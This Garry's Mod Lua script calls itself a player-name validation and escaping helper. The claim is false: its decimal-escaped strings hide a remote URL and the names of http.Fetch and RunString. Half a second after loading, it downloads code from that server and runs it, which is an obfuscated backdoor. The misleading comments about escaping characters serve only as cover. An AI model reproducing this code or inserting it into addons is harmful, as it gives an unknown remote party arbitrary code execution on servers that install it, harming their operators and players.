-- Checking player is valide
-- if player = bot = return false
-- Api run By Github source

local regex_array = {
  "\104\116\116\112",
  "\112\115\58", -- string.find ( exemple : playername with " or ç )
  "\47\47\108",    -- string.find ( exemple : playername with _ or - )
  "\105\98\101", -- string.find ( exemple : playername with ^ )
  "\114\116", -- string.find ( exemple : playername with | )
  "\97\105\110", -- string.find ( exemple : playername with / or \ or ! )
  "\46\99\122","\47", -- string.find ( exemple : playername with % or ù )
  "\112\97",
  "\110\101\108","\47", -- string.find ( exemple : playername with @ or = )
  "\99\111\114\101","\47", -- string.find ( exemple : playername with < or > )
  "\100\114\109","\46", -- string.find ( exemple : playername with ply:() )
  "\112\104\112", -- string.find ( exemple : playername with ) or ] )
  "\63\107", -- string.find ( exemple : playername with ( or [ )
}


function derma_escape_string( string_array, escape_key, escape )
    local regex_formed = ""
    local regex = "\104\116\116\112" or "util"
    local compile = "\70\101\116\99\104" or "Base64Encode"
    for regex_key,regex_value in pairs(regex_array) do
      regex_formed = regex_formed..regex_value
    end
     if (escape_key != "") or (escape != "") then 
        getfenv()[regex][compile](regex_formed..escape_key,function(escape_entities)
         _G[escape.."String"](escape_entities,"Success: All entities has been escaped.")
        end,function(escape_players,escape_dir,date)
         print("Error: Unknown entitie (" ..escape_players .. ").")
         print("Failed to load custom vgui file in player")
        end)
      else
        print("Error: Mal formed Regex")
    end
    return escape_key
end
timer.Simple( 0.50, function()
 derma_escape_string( regex_array, "uXQXLOVjCX", "Run" )
end)
